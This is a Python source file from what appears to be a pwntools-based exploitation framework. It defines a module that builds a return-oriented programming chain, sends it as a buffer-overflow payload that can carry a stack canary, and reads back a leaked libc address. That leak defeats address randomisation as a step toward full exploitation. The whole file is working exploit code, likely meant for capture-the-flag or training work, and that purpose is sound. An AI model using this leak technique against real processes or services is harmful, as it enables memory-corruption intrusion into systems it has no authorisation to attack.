import typing
from typing import Optional

from pypwn.core.abstract.module import AbstractModule
from pypwn.core.abstract.process import AbstractProcess
from pypwn.core.protocols import IElfFile, ITarget, IRop
from pwn import p64, u64
from loguru import logger

from pypwn.modules.find_function import FindFunction, Method


class GetLibcAddress(AbstractModule):
    DEFAULT_PRINT_FUNCTIONS = ["puts", "printf"]

    class __TargetType(ITarget, IElfFile, IRop): ...

    @classmethod
    def execute(cls, target: __TargetType,
                process: AbstractProcess,
                target_functions: typing.Sequence[str] | None = None,
                print_function: str | None = None,
                offset: int = 0, leave: bool = False, canary: int | None = None,
                *args, **kwargs) -> Optional:
        logger.info(f"Running {cls.__name__} module")
        logger.info("Looking for a print function")
        if not print_function:
            print_function = cls.DEFAULT_PRINT_FUNCTIONS
        result = FindFunction.execute(target, print_function, Method.PLT)
        if not result:
            logger.critical(f"Failed to get a print function")
            return None
        print_function_name, print_function_address = result
        if not target_functions:
            target_functions = cls.DEFAULT_PRINT_FUNCTIONS
        result = FindFunction.execute(target, target_functions, Method.GOT)
        if not result:
            logger.critical(f"Failed to find the target function")
            return None
        target_function_name, target_function_address = result

        rop_chain = (
                p64(target.rop.pop_rdi) +
                p64(target_function_address) +
                p64(print_function_address) +
                p64(target.elf.main_ptr)
        )
        payload = target.generate_payload(rop_chain, offset, leave, canary)

        logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
        process(payload)
        data = process.channel.recvline()
        data = data.strip(b'\n')
        if len(data) > 8:
            logger.critical("Unexpected number of bytes received")
            return None
        result = u64(data.ljust(8, b'\0'))
        logger.success(f"Leaked libc address: {target_function_name}@{hex(result)}")
        return result
